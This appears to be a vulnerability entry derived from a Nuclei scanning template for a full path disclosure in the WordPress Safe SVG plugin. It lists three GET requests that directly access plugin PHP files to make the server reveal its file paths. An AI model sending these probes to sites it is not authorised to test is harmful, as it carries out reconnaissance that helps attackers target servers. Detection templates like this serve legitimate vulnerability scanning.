# Vulnerability: WordPress Plugin Safe SVG - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-safe-svg-fpd.yaml`)

## Description
WordPress Safe SVG plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/safe-svg/includes/class-safe-svg.php
GET {{BaseURL}}/wp-content/plugins/safe-svg/lib/vendor/enshrined/svg-sanitize/src/Sanitizer.php
GET {{BaseURL}}/wp-content/plugins/safe-svg/lib/safe-svg-tags.php
```

